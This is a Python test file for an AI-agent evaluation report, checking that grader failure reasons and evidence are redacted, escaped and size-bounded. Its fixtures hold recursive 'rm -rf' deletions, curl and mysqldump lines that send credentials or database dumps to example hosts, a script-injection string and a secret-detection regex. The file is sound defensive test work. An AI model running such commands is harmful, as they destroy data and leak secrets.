# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Grader failure reasons and evidence excerpts reach the Tier 3 HTML report.

A failing evaluator score must explain itself: the evaluator card names the
grader's reason and quotes the offending artifact, and the drill-down cell
carries the same reason as a tooltip. Both surfaces are redacted and bounded.
"""

from __future__ import annotations

import copy
import html as html_lib
import json
import re
from typing import Any

import pytest

from skillevaluator.evaluation import tier3_report
from skillevaluator.evaluation.tier3_findings import (
    _MAX_SCAN_CHARS,
    MAX_REASON_CHARS,
    failure_excerpt,
    failure_reason,
    failure_reason_text_slots,
    sanitize_grader_text,
    strip_failure_reason_text,
)
from skillevaluator.evaluation.tier3_report import build_agent_eval_payload
from skillevaluator.models import ValidationResult
from skillevaluator.reporting import HTMLReporter
from skillevaluator.reporting import html as html_module
from skillevaluator.reporting.dashboard_data import _trial_coverage_truncated
from skillevaluator.tier3.harbor.metrics import DEFAULT_METRICS

METRICS = list(DEFAULT_METRICS)
DESTRUCTIVE_REASON = "Agent executed potentially destructive command: rm -rf"
DESTRUCTIVE_COMMAND = "find input -type d -name __pycache__ -prune -print -exec rm -rf {} +"
PASSING_SECURITY_REASON = "No unsafe agent-issued actions, secret leakage, or unauthorized access found in trajectory"
# A credential with no recognizable shape, as a self-hosted gateway might issue.
# Only its configured value identifies it.
GATEWAY_CREDENTIAL = "gatewaytokengatewaytoken"


def _finding(
    evidence: str,
    *,
    finding_type: str = "destructive_command",
    message: str = DESTRUCTIVE_REASON,
) -> dict[str, Any]:
    return {
        "type": finding_type,
        "severity": "critical",
        "message": message,
        "evidence": evidence,
        "source": "agent_tool_call",
        "score_impact": True,
    }


def _security_details(*findings: dict[str, Any], reason: str = DESTRUCTIVE_REASON) -> dict[str, Any]:
    return {"security": {"passed": False, "score": 0.0, "reason": reason, "findings": list(findings)}}


def _reward(
    entry_id: str = "case-1",
    trial_id: str = "case-1__attempt1",
    *,
    security: float = 0.0,
    details: dict[str, Any] | None = None,
    **scores: float,
) -> dict[str, Any]:
    reward: dict[str, Any] = {
        "trial_id": trial_id,
        "entry_id": entry_id,
        **dict.fromkeys(METRICS, 0.9),
        "security": security,
        **scores,
    }
    if details is not None:
        reward["details"] = details
    return reward


def _mean_scores(rewards: list[dict[str, Any]]) -> dict[str, float]:
    return {metric: sum(reward[metric] for reward in rewards) / len(rewards) for metric in METRICS} if rewards else {}


def _payload(rewards: list[dict[str, Any]], baseline: list[dict[str, Any]] | None = None) -> dict[str, Any]:
    baseline = baseline or []
    payload = build_agent_eval_payload(
        "demo",
        {
            "codex": {
                "execution_status": "succeeded",
                "expected_attempts": len(rewards) + len(baseline),
                "scored_attempts": len(rewards) + len(baseline),
                "with_skill": _mean_scores(rewards),
                "without_skill": _mean_scores(baseline),
                "rewards": rewards,
                "rewards_baseline": baseline,
                "num_trials": len(rewards),
                "num_trials_baseline": len(baseline),
            }
        },
        use_llm_judge=False,
    )
    assert payload is not None
    return payload


def _render(payload: dict[str, Any]) -> str:
    result = ValidationResult(validator_name="AGENT_EVAL", validator_description="Live evaluation")
    result.metadata["agent_eval"] = payload
    return HTMLReporter(include_timestamp=False).render_all([result])


def _security_card(payload: dict[str, Any]) -> dict[str, Any]:
    return next(card for card in payload["agents"]["codex"]["evaluator_cards"] if card["id"] == "security")


def _security_evidence_html(html: str) -> str:
    cards = html.split('class="t3-eval-card', 1)[1]
    match = re.search(r'<details class="t3-eval-evidence"[^>]*>.*?</details>', cards, re.DOTALL)
    assert match is not None
    return match.group(0)


def _drilldown_table(html: str) -> str:
    match = re.search(r'<table class="summary-table" id="t3-trials-table">(.*?)</table>', html, re.DOTALL)
    assert match is not None
    return match.group(1)


def test_failed_security_score_explains_card_and_drilldown_cell() -> None:
    payload = _payload([_reward(details=_security_details(_finding(DESTRUCTIVE_COMMAND)))])

    assert payload["trials"][0]["score_reasons"] == {"security": DESTRUCTIVE_REASON}
    # The drill-down reads the flattened trials, so the per-agent copy stays lean.
    assert "score_reasons" not in payload["agents"]["codex"]["trials"][0]
    card = _security_card(payload)
    assert card["status"] == "fail"
    assert card["evidence"][0]["notes"] == [DESTRUCTIVE_REASON]
    assert card["evidence"][0]["excerpt"] == DESTRUCTIVE_COMMAND

    html = _render(payload)
    evidence_html = _security_evidence_html(html)
    assert evidence_html.startswith('<details class="t3-eval-evidence" open>')
    assert f'<code class="t3-ev-excerpt">{DESTRUCTIVE_COMMAND}</code>' in evidence_html
    table = _drilldown_table(html)
    assert f'title="Security: {DESTRUCTIVE_REASON}"><span class="t3-score-reason">0.00</span>' in table


def test_reward_without_details_renders_without_reasons() -> None:
    payload = _payload([_reward()])

    assert "score_reasons" not in payload["trials"][0]
    assert all("excerpt" not in item for item in _security_card(payload)["evidence"])
    html = _render(payload)
    assert 'title="Security:' not in html
    assert 'class="t3-score-reason"' not in html


def test_passing_metric_carries_no_reason_or_excerpt() -> None:
    details = {"security": {"passed": True, "score": 1.0, "reason": PASSING_SECURITY_REASON, "findings": []}}
    payload = _payload([_reward(security=1.0, details=details)])

    assert "score_reasons" not in payload["trials"][0]
    card = _security_card(payload)
    assert card["status"] == "pass"
    assert card["evidence"][0]["notes"] == [PASSING_SECURITY_REASON]
    assert "excerpt" not in card["evidence"][0]
    assert _security_evidence_html(_render(payload)).startswith('<details class="t3-eval-evidence">')


def test_baseline_rows_carry_their_own_reasons() -> None:
    payload = _payload(
        [_reward(details=_security_details(_finding(DESTRUCTIVE_COMMAND)))],
        [
            _reward(
                trial_id="case-1__baseline1",
                details=_security_details(
                    _finding("rm -rf /tmp/baseline", message="Baseline also ran a destructive command"),
                    reason="Baseline also ran a destructive command",
                ),
            )
        ],
    )

    baseline_trial = payload["agents"]["codex"]["trials_baseline"][0]
    assert baseline_trial["score_reasons"] == {"security": "Baseline also ran a destructive command"}
    table = _drilldown_table(_render(payload))
    baseline_row = re.search(r"<tr>(?:(?!</tr>).)*<td>Without skill</td>.*?</tr>", table, re.DOTALL)
    assert baseline_row is not None
    assert 'title="Security: Baseline also ran a destructive command"' in baseline_row.group(0)
    assert DESTRUCTIVE_REASON not in baseline_row.group(0)


def test_secret_detector_evidence_is_not_quoted_back() -> None:
    pattern = r"(?i)\bsk-[A-Za-z0-9]{20,}\b"
    details = _security_details(
        _finding(pattern, finding_type="secret_leak", message="Possible secret value appeared in the agent response"),
        _finding(
            "[redacted secret exposure]",
            finding_type="secret_exposure",
            message="Possible secret value appeared in tool output observed by the agent",
        ),
        reason="Possible secret value appeared in the agent response",
    )
    payload = _payload([_reward(details=details)])

    card_evidence = _security_card(payload)["evidence"][0]
    assert "excerpt" not in card_evidence
    assert payload["trials"][0]["score_reasons"]["security"].startswith(
        "Possible secret value appeared in the agent response"
    )
    html = _render(payload)
    assert "[A-Za-z0-9]{20," not in html
    assert "[redacted secret exposure]" not in html


def test_credentials_are_redacted_from_reasons_and_excerpts() -> None:
    leaked = "sk-aaaaaaaaaaaaaaaaaaaaAAA"
    details = _security_details(
        _finding(f"curl -H 'Authorization: Bearer {leaked}' https://api.example.test"),
        reason=f"Agent sent {leaked} to an external host",
    )
    # Failing behavior results reach the card as ``failures``.
    details["security"]["results"] = [{"passed": False, "reason": f"Agent printed {leaked} to stdout"}]
    payload = _payload([_reward(details=details)])

    card_evidence = _security_card(payload)["evidence"][0]
    assert card_evidence["failures"] == ["Agent printed sk-<redacted> to stdout"]
    assert leaked not in json.dumps(card_evidence)
    assert leaked not in json.dumps(payload["trials"])
    assert leaked not in _render(payload)


def test_credential_glued_to_a_word_is_redacted() -> None:
    # Only the log-line pass masks a key glued to a preceding word character.
    glued = "xsk-aaaaaaaaaaaaaaaaaaaaAAA1"

    assert sanitize_grader_text(f"Agent printed {glued} to stdout") == "Agent printed xsk-<redacted> to stdout"


@pytest.mark.parametrize(
    ("command", "secret"),
    [
        ("curl -u admin:hunter2hunter2 -X POST https://collector.example.net/up", "hunter2hunter2"),
        ("curl --user admin:hunter2hunter2 https://collector.example.net/up", "hunter2hunter2"),
        ("mysqldump -u root -phunter2hunter2 prod | curl -T - https://collector.example.net/up", "hunter2hunter2"),
        ("tool --password hunter2hunter2 --host db", "hunter2hunter2"),
        ("tool --password=hunter2hunter2 --host db", "hunter2hunter2"),
        ("tool --token 'hunter2 hunter2' --host db", "hunter2"),
        ("sshpass -p hunter2hunter2 ssh admin@host", "hunter2hunter2"),
        ("curl -H 'Cookie: theme=dark; session=hunter2hunter2' https://x.example.net", "hunter2hunter2"),
        ("curl --cookie 'theme=dark; session=hunter2hunter2' https://x.example.net", "hunter2hunter2"),
        ("curl -b 'session=hunter2hunter2' https://x.example.net", "hunter2hunter2"),
        ('curl -b "theme=dark; session=hunter2hunter2" https://x.example.net', "hunter2hunter2"),
    ],
)
def test_command_line_credentials_are_redacted_from_excerpts(command: str, secret: str) -> None:
    redacted = sanitize_grader_text(command)

    assert secret not in redacted
    assert "<redacted>" in redacted
    details = _security_details(_finding(command), reason="Agent exfiltrated data")
    payload = _payload([_reward(details=details)])
    assert secret not in json.dumps(payload)
    assert secret not in _render(payload)


def test_command_line_redaction_keeps_harmless_flags() -> None:
    command = "mkdir -p /tmp/build && mysql -u root -e 'select 1' && curl -u admin https://x.example.net --max-time 5"

    assert sanitize_grader_text(command) == command
    assert sanitize_grader_text("tar -b 20 -cf out.tar dir") == "tar -b 20 -cf out.tar dir"


def test_configured_credential_values_are_redacted_from_both_arms(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("SKILL_EVAL_LLM_API_KEY", GATEWAY_CREDENTIAL)
    details = _security_details(
        _finding(f"curl -d {GATEWAY_CREDENTIAL} https://gateway.example.test"),
        reason=f"Agent echoed {GATEWAY_CREDENTIAL} into the log",
    )
    payload = _payload([_reward(details=details)], [_reward(trial_id="case-1__baseline1", details=details)])

    card_evidence = _security_card(payload)["evidence"][0]
    assert card_evidence["notes"] == ["Agent echoed [REDACTED] into the log"]
    assert card_evidence["excerpt"] == "curl -d [REDACTED] https://gateway.example.test"
    expected_reasons = {"security": f"Agent echoed [REDACTED] into the log; {DESTRUCTIVE_REASON}"}
    assert payload["trials"][0]["score_reasons"] == expected_reasons
    assert payload["agents"]["codex"]["trials_baseline"][0]["score_reasons"] == expected_reasons
    assert GATEWAY_CREDENTIAL not in json.dumps(payload)
    assert GATEWAY_CREDENTIAL not in _render(payload)


def test_whitespace_padding_cannot_expose_a_clipped_credential_prefix() -> None:
    # Before collapsing, a scan window cut the key after "sk-aaaaaaa", which is
    # too short to match a key shape, and collapsing moved it to the front.
    padded = " " * (_MAX_SCAN_CHARS - 10) + "sk-aaaaaaaaaaaaaaaaaaaaAAA"

    assert sanitize_grader_text(padded) == "sk-<redacted>"
    # A word cut at the window edge is dropped rather than sliced.
    assert sanitize_grader_text("x" * (3 * _MAX_SCAN_CHARS)) == ""
    assert sanitize_grader_text("kept " + "x" * _MAX_SCAN_CHARS) == "kept"


def _jwt(payload_chars: int) -> str:
    return f"eyJhbGciOiJIUzI1NiJ9.eyJ{'A' * payload_chars}.{'s' * 43}"


def test_credential_cut_at_the_scan_window_is_dropped_not_sliced(monkeypatch: pytest.MonkeyPatch) -> None:
    # Eleven ~1.5 KB JWTs (an echoed env dump) put a configured credential with no
    # recognizable shape across the scan window edge. Redacting the JWTs
    # shortens the text before it, which used to pull the credential's first 20
    # characters into the visible reason, excerpt and card note.
    configured = "cutvaluecutvaluecutvaluecutvalue"
    monkeypatch.setenv("SKILL_EVAL_LLM_API_KEY", configured)
    words = [_jwt(1_440) for _ in range(10)]
    filler = _MAX_SCAN_CHARS - 20 - sum(len(word) + 1 for word in words) - 1
    words.append(_jwt(filler - len(_jwt(0))))
    text = " ".join([*words, configured])
    assert text.index(configured) == _MAX_SCAN_CHARS - 20

    for visible in (
        failure_reason({"reason": text}),
        failure_excerpt({"evidence": text}),
        sanitize_grader_text(text)[:512],
    ):
        assert visible.endswith("jwt-<redacted>")
        assert configured[:8] not in visible


def test_line_break_ends_a_masked_assignment() -> None:
    # A ``key: value`` assignment is masked to the end of its line; collapsing
    # the line break first used to mask the explanation that follows.
    reason = "auth_token: missing\nThe agent hardcoded the login response instead of calling the endpoint"
    details = {"security": {"passed": False, "score": 0.0, "reason": reason, "findings": []}}
    payload = _payload([_reward(details=details)])

    expected = "auth_token:<redacted>\nThe agent hardcoded the login response instead of calling the endpoint"
    assert sanitize_grader_text(reason) == expected
    assert (
        failure_reason({"message": reason, "attribution_explanation": "Skill-caused."}) == f"{expected}; Skill-caused."
    )
    assert _security_card(payload)["evidence"][0]["notes"] == [expected]
    assert payload["trials"][0]["score_reasons"] == {"security": expected}
    html = _render(payload)
    assert "The agent hardcoded the login response" in _security_evidence_html(html)
    assert f'title="Security: {html_lib.escape(expected)}"' in _drilldown_table(html)
    assert sanitize_grader_text("one \r\n\t two  \n\n three\tfour") == "one\ntwo\nthree four"


def test_evidence_markup_is_escaped_exactly_once() -> None:
    details = _security_details(
        _finding("<script>alert(1)</script>"),
        reason="Agent wrote <script> into a served file",
    )

    html = _render(_payload([_reward(details=details)]))

    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html
    assert "&amp;lt;script&amp;gt;" not in html
    assert "<script>alert(1)</script>" not in html


def test_message_only_detail_explains_failing_score() -> None:
    details = {"skill_execution": {"passed": False, "score": 0.0, "message": "No tool calls in trajectory"}}
    payload = _payload([_reward(security=1.0, skill_execution=0.0, details=details)])

    assert payload["trials"][0]["score_reasons"] == {"skill_execution": "No tool calls in trajectory"}
    card = next(card for card in payload["agents"]["codex"]["evaluator_cards"] if card["id"] == "skill_execution")
    # The built reason stays apart from the grader's own notes, so size limits
    # can drop it first; the card still shows it.
    assert card["evidence"][0]["notes"] == []
    assert card["evidence"][0]["reason"] == "No tool calls in trajectory"
    cards_html = _render(payload).split('class="t3-eval-card', 1)[1]
    assert re.search(r'<span class="t3-ev-notes">\s*No tool calls in trajectory', cards_html)


def test_passing_attempt_does_not_hide_failing_attempt_reason() -> None:
    passing = {"security": {"passed": True, "score": 1.0, "reason": PASSING_SECURITY_REASON, "findings": []}}
    payload = _payload(
        [
            _reward(trial_id="case-1__attempt1", security=1.0, details=passing),
            _reward(trial_id="case-1__attempt2", details=_security_details(_finding(DESTRUCTIVE_COMMAND))),
        ]
    )

    evidence_html = _security_evidence_html(_render(payload))

    assert DESTRUCTIVE_REASON in evidence_html
    assert DESTRUCTIVE_COMMAND in evidence_html
    assert PASSING_SECURITY_REASON not in evidence_html
    assert "\u00d72" in evidence_html


def test_multi_row_trial_takes_reason_from_failing_row() -> None:
    payload = _payload(
        [
            _reward(security=1.0),
            _reward(details=_security_details(_finding(DESTRUCTIVE_COMMAND))),
        ]
    )

    trial = payload["trials"][0]
    assert trial["scores"]["security"] == 0.5
    assert trial["score_reasons"] == {"security": DESTRUCTIVE_REASON}


def _scored_security_details(reason: str, score: float) -> dict[str, Any]:
    return {"security": {"passed": False, "score": score, "reason": reason, "findings": []}}


def test_multi_row_trial_takes_reason_from_lowest_scoring_failing_row() -> None:
    payload = _payload(
        [
            _reward(security=0.5, details=_scored_security_details("Reason A: partial leak", 0.5)),
            _reward(security=0.0, details=_scored_security_details("Reason B: destructive command", 0.0)),
        ]
    )

    assert payload["trials"][0]["score_reasons"] == {"security": "Reason B: destructive command"}


def test_card_shows_lowest_scoring_failing_attempt_reason() -> None:
    payload = _payload(
        [
            _reward(
                trial_id="case-1__attempt1",
                security=0.5,
                details=_scored_security_details("Reason A: partial leak", 0.5),
            ),
            _reward(
                trial_id="case-1__attempt2",
                security=0.0,
                details=_scored_security_details("Reason B: destructive command", 0.0),
            ),
        ]
    )

    evidence_html = _security_evidence_html(_render(payload))

    assert "Reason B: destructive command" in evidence_html
    assert "Reason A: partial leak" not in evidence_html


def test_card_lists_failed_behavior_results_once() -> None:
    # judge_behavior_check records the judge summary as ``reason``, which can be empty.
    failed = ["Did not cite the source document", "Deleted files without asking"]
    details = {
        "behavior_check": {
            "passed": False,
            "reason": "",
            "results": [
                {"behavior": f"b{index}", "passed": False, "reason": text} for index, text in enumerate(failed)
            ],
        }
    }
    payload = _payload([_reward(security=1.0, behavior_check=0.0, details=details)])

    card = next(card for card in payload["agents"]["codex"]["evaluator_cards"] if card["id"] == "behavior_check")
    assert card["evidence"][0]["failures"] == failed
    assert "reason" not in card["evidence"][0]
    # The drill-down tooltip has no separate failures list, so it keeps them.
    assert payload["trials"][0]["score_reasons"] == {"behavior_check": "; ".join(failed)}
    match = re.search(
        r'<div class="t3-eval-title">Behavior Check</div>.*?(<details class="t3-eval-evidence".*?</details>)',
        _render(payload),
        re.DOTALL,
    )
    assert match is not None
    for text in failed:
        assert match.group(1).count(text) == 1


def test_attempts_quoting_different_commands_share_one_card_entry_per_case() -> None:
    # The security grader writes one fixed reason per finding label and quotes
    # the command, which differs per attempt, in the finding evidence.
    rewards = [
        _reward(
            entry_id=f"case-{case}",
            trial_id=f"case-{case}__attempt{attempt}",
            details=_security_details(_finding(f"rm -rf /tmp/build-{case}-{attempt} ~/work")),
        )
        for case in range(8)
        for attempt in range(3)
    ]
    payload = _payload(rewards)

    card = _security_card(payload)
    assert [entry["entry_id"] for entry in card["evidence"]] == [f"case-{case}" for case in range(8)]
    assert [entry["occurrences"] for entry in card["evidence"]] == [3] * 8
    assert card["evidence"][0]["excerpt"] == "rm -rf /tmp/build-0-0 ~/work"
    assert "evidence_sampling" not in card
    assert "evidence_entries" not in payload.get("report_truncation", {}).get("omitted", {})
    assert "Per-trial evidence (8 cases, 24 trials)" in _render(payload)


def test_reason_deduplicates_after_redaction() -> None:
    reason = failure_reason(
        {
            "passed": False,
            "reason": "token=sk-aaaaaaaaaaaaaaaaaaaaAAA leaked",
            "findings": [{"passed": False, "message": "token=sk-bbbbbbbbbbbbbbbbbbbbBBB leaked", "score_impact": True}],
        }
    )

    assert reason == "token=<redacted> leaked"


def test_reason_names_failed_checks_criteria_and_attribution() -> None:
    reason = failure_reason(
        {
            "criteria": {"TASK_ADDRESSED": False, "SKILL_IDENTIFIED": True, "ACTIONABLE": False},
            "command_injection_check": {"passed": False, "score": 0.0},
            "attribution_explanation": "The skill instructions requested the command.",
        }
    )

    assert reason == (
        "Failed criteria: ACTIONABLE, TASK_ADDRESSED; Command injection check failed; "
        "The skill instructions requested the command."
    )


def test_reason_is_bounded_and_marks_truncation() -> None:
    reason = failure_reason(
        {
            "reason": "A" * 200,
            "findings": [{"message": f"{letter * 200}", "score_impact": True} for letter in "BCDEF"],
        }
    )

    assert len(reason) <= MAX_REASON_CHARS
    assert reason.endswith("...<truncated>")
    assert "D" not in reason


def test_reason_ignores_criteria_excluded_from_the_score() -> None:
    # The accuracy grader excludes skill identification when no skill is
    # expected, and the judge is told to mark it false.
    detail = {
        "score": 0.75,
        "reason": "Answer omitted the retry limit.",
        "criteria": {"SKILL_IDENTIFIED": False, "ACTION_CORRECT": True, "FACTUALLY_ACCURATE": False},
        "excluded_criteria": ["SKILL_IDENTIFIED"],
    }

    assert failure_reason(detail) == "Answer omitted the retry limit.; Failed criteria: FACTUALLY_ACCURATE"
    assert failure_reason({"criteria": {"SKILL_IDENTIFIED": False}, "excluded_criteria": ["SKILL_IDENTIFIED"]}) == ""


def test_render_drops_malformed_reasons_and_excerpts() -> None:
    payload = _payload([_reward(details=_security_details(_finding(DESTRUCTIVE_COMMAND)))])
    payload["trials"][0]["score_reasons"] = {"security": {"nested": DESTRUCTIVE_REASON}}
    for cards in (payload["evaluator_cards"], payload["agents"]["codex"]["evaluator_cards"]):
        next(card for card in cards if card["id"] == "security")["evidence"][0]["excerpt"] = ["rm", "-rf"]

    html = _render(payload)

    assert 'class="t3-score-reason"' not in _drilldown_table(html)
    assert '<code class="t3-ev-excerpt">' not in html
    assert DESTRUCTIVE_REASON in _security_evidence_html(html)


def test_reason_reads_plain_string_findings() -> None:
    # Legacy and custom graders list findings as strings; the terminal findings
    # report already treats them as failure reasons.
    assert failure_reason({"findings": ["Wrote outside the workspace", 7]}) == "Wrote outside the workspace"


def test_reason_names_the_type_of_a_finding_without_message() -> None:
    finding = {"type": "dangerous_command", "evidence": "rm -rf /cache", "score_impact": True}
    attribution = "The skill told the agent to delete the cache."

    assert failure_reason({"findings": [finding]}) == "dangerous_command"
    assert failure_reason({"findings": [finding] * 8, "attribution_explanation": attribution}) == "dangerous_command"


def test_blank_candidates_do_not_count_toward_the_candidate_cap() -> None:
    blank = {"evidence": "rm -rf /cache", "score_impact": True}
    attribution = "The skill told the agent to delete the cache."
    detail = {
        "reason": "  ",
        "findings": [blank] * 8,
        "results": [{"passed": False}] * 8,
        "attribution_explanation": attribution,
    }

    assert failure_reason(detail) == attribution


def test_reason_redacts_a_bounded_number_of_candidates() -> None:
    repeated = [{"message": "Same destructive command", "score_impact": True}] * 64
    detail = {"findings": [*repeated, {"message": "Late finding", "score_impact": True}]}

    assert failure_reason(detail) == "Same destructive command"


def test_excerpt_skips_passing_findings_and_falls_back_to_detail_evidence() -> None:
    detail = {
        "findings": [{"type": "refusal_observed", "evidence": "I will not do that", "score_impact": False}],
        "evidence": "  multi\n  line   excerpt ",
    }

    assert failure_excerpt(detail) == "multi\nline excerpt"
    assert failure_excerpt({"findings": "not-a-list"}) == ""
    assert failure_reason("not-a-dict") == ""


# --- Size limits drop built reasons before anything else -------------------------

_BULKY_REASON = (
    "Agent executed potentially destructive command while cleaning caches; the grader observed an unbounded "
    "recursive delete outside the declared workspace and flagged it as score impacting"
)


def _failing_multi_agent_payload(agents: int, trials: int) -> dict[str, Any]:
    """Two of six with-skill and four of six baseline metrics fail on every trial."""
    infos: dict[str, Any] = {}
    for agent_index in range(agents):
        arms: dict[str, list[dict[str, Any]]] = {}
        for arm, failing in (("rewards", METRICS[:2]), ("rewards_baseline", METRICS[:4])):
            arms[arm] = [
                {
                    "trial_id": f"{arm}-{agent_index}-{index}",
                    "entry_id": f"case-{index}",
                    **dict.fromkeys(METRICS, 0.9),
                    **dict.fromkeys(failing, 0.2),
                    "details": {
                        metric: {
                            "passed": False,
                            "findings": [_finding(f"rm -rf build-{index}", message=f"{_BULKY_REASON} ({metric})")],
                        }
                        for metric in failing
                    },
                }
                for index in range(trials)
            ]
        infos[f"agent-{agent_index}"] = {
            "execution_status": "succeeded",
            "expected_attempts": 2 * trials,
            "scored_attempts": 2 * trials,
            "with_skill": _mean_scores(arms["rewards"]),
            "without_skill": _mean_scores(arms["rewards_baseline"]),
            **arms,
            "num_trials": trials,
            "num_trials_baseline": trials,
        }
    payload = build_agent_eval_payload("demo", infos, use_llm_judge=False)
    assert payload is not None
    return payload


def _display_data(payload: dict[str, Any]) -> dict[str, Any]:
    result = ValidationResult(validator_name="AGENT_EVAL", validator_description="Live evaluation")
    result.metadata["agent_eval"] = payload
    data = HTMLReporter(include_timestamp=False)._tier3_report_data([result])
    assert data is not None
    return data


def _reason_count(payload: dict[str, Any]) -> int:
    return len(list(failure_reason_text_slots(payload)))


def _rendered_reason_count(payload: dict[str, Any]) -> int:
    """Reasons the page renders: agents' cards and drill-down rows, not the top-level card copy."""
    return len(list(failure_reason_text_slots(payload, include_top_level_cards=False)))


def _compact_size(value: object) -> int:
    return len(json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode("utf-8"))


def _overview_ids(payload: dict[str, Any]) -> tuple[Any, ...]:
    return (
        payload["best_agent"],
        [dimension["id"] for dimension in payload["dimensions"]],
        {name: [card["id"] for card in agent["evaluator_cards"]] for name, agent in payload["agents"].items()},
    )


def test_html_preview_keeps_the_overview_when_failure_reasons_overflow_it() -> None:
    # Without reasons this run renders in full; with them it crosses the preview
    # trigger. Reasons must not spend the preview budget ahead of the overview.
    payload = _failing_multi_agent_payload(2, 40)
    data = _display_data(payload)
    all_reasons = _reason_count(data)
    total = _rendered_reason_count(data)
    assert _compact_size(data) > html_module._TIER3_HTML_PREVIEW_TRIGGER_BYTES

    preview, notice = html_module._bounded_tier3_preview(data)

    assert preview is not None
    assert _compact_size(preview) <= html_module._TIER3_HTML_PREVIEW_TRIGGER_BYTES
    assert _overview_ids(preview) == _overview_ids(data)
    assert data["best_agent"] and all(_overview_ids(data)[1])
    assert set(notice) == {"failure_reasons"}
    # The preview drops the unrendered top-level card copy without counting it.
    assert _reason_count(preview) == _rendered_reason_count(preview)
    kept = _rendered_reason_count(preview)
    assert 0 < kept < total
    assert kept + notice["failure_reasons"] == total
    # The canonical payload embedded next to the preview keeps every reason.
    assert _reason_count(data) == all_reasons > total

    html = _render(payload)
    assert f"HTML preview left out {notice['failure_reasons']} failure reasons or excerpts" in html
    assert "HTML preview omitted" not in html
    assert "built-in method" not in html


def test_html_preview_excludes_unrendered_activation_detail_without_changing_canonical_data() -> None:
    data = _display_data(_failing_multi_agent_payload(2, 1))
    detail = {"diagnostic": "unrendered-activation-detail" * 30_000}
    data["trials"][0]["activation_validation"] = detail
    for key in ("trials", "trials_baseline"):
        data["agents"]["agent-0"][key][0]["activation_validation"] = detail
    original = copy.deepcopy(data)

    preview, notice = html_module._bounded_tier3_preview(data)

    assert preview is not None
    assert notice == {}
    assert preview["best_agent"] == "agent-0"
    assert _rendered_reason_count(preview) == _rendered_reason_count(data)
    assert "unrendered-activation-detail" not in json.dumps(preview)
    assert data == original
    assert data["trials"][0]["activation_validation"] == detail


def test_html_preview_drops_failure_reasons_before_bounding_a_large_payload() -> None:
    payload = _failing_multi_agent_payload(3, 60)
    data = _display_data(payload)
    total = _rendered_reason_count(data)

    preview, notice = html_module._bounded_tier3_preview(data)

    assert preview is not None
    assert notice["failure_reasons"] == total
    assert _reason_count(preview) == 0
    assert preview["best_agent"] == data["best_agent"] != ""
    # 180 with-skill rows across agents and 60 baseline rows per agent: the walk
    # keeps 64 of each.
    assert notice["trial_rows"] == 180 - 64

    html = _render(payload)
    assert _compact_size(data) > 256 * 1024
    assert payload["dataset_sufficiency"]["coverage_summary"] in html
    # The character count depends on the environment, so it comes from the notice.
    assert f"HTML preview omitted {notice['characters']} characters and {notice['items']} items." in html
    assert f"HTML preview left out {total} failure reasons or excerpts" in html
    assert f"The HTML preview left out {notice['trial_rows']} per-trial rows" in html


def test_html_preview_does_not_report_unrendered_top_level_card_reasons() -> None:
    # The page renders every reason of this run; only the top-level card copy,
    # which the page never shows, did not fit.
    payload = _failing_multi_agent_payload(2, 36)
    data = _display_data(payload)
    assert _compact_size(data) > html_module._TIER3_HTML_PREVIEW_TRIGGER_BYTES

    preview, notice = html_module._bounded_tier3_preview(data)

    assert preview is not None
    assert notice == {}
    assert _rendered_reason_count(preview) == _rendered_reason_count(data)
    html = _render(payload)
    assert "HTML preview left out" not in html
    assert "HTML preview omitted" not in html


def test_row_cap_note_appears_only_when_drilldown_rows_were_capped() -> None:
    rewards = [_reward(entry_id=f"case-{index}", trial_id=f"case-{index}__attempt1") for index in range(20)]
    baseline = [_reward(entry_id=f"case-{index}", trial_id=f"case-{index}__baseline1") for index in range(20)]
    infos = {
        "codex": {
            "execution_status": "succeeded",
            "expected_attempts": 40,
            "scored_attempts": 40,
            "with_skill": _mean_scores(rewards),
            "without_skill": _mean_scores(baseline),
            "rewards": rewards,
            "rewards_baseline": baseline,
            "num_trials": 20,
            "num_trials_baseline": 20,
        }
    }
    # A large dataset alone pushes the display payload over the preview trigger.
    dataset = [{"id": f"case-{index}", "prompt": f"Prompt {index}: " + "p" * 3_000} for index in range(100)]
    payload = build_agent_eval_payload("demo", infos, dataset=dataset, use_llm_judge=False)
    assert payload is not None
    data = _display_data(payload)
    assert _compact_size(data) > html_module._TIER3_HTML_PREVIEW_TRIGGER_BYTES

    preview, notice = html_module._bounded_tier3_preview(data)

    assert preview is not None
    assert notice.get("items", 0) > 0
    assert "trial_rows" not in notice
    html = _render(payload)
    assert "per-trial row" not in html
    table = _drilldown_table(html)
    assert table.count("<td>With skill</td>") == 20
    assert table.count("<td>Without skill</td>") == 20


def test_canonical_budget_drops_failure_reasons_before_recorded_evidence(monkeypatch: pytest.MonkeyPatch) -> None:
    full = _failing_multi_agent_payload(2, 10)
    slim = copy.deepcopy(full)
    removed = strip_failure_reason_text(slim)
    assert removed == _reason_count(full) > 0
    monkeypatch.setattr(tier3_report, "_MAX_EMBEDDED_REPORT_BYTES", (_compact_size(slim) + _compact_size(full)) // 2)

    payload = _failing_multi_agent_payload(2, 10)

    truncation = payload["report_truncation"]
    assert truncation["omitted"] == {"failure_reasons": removed}
    assert payload["agents"] == slim["agents"]
    assert payload["trials"] == slim["trials"]
    # Dropping reasons does not reduce the trial population dashboards count.
    assert _trial_coverage_truncated(truncation) is False
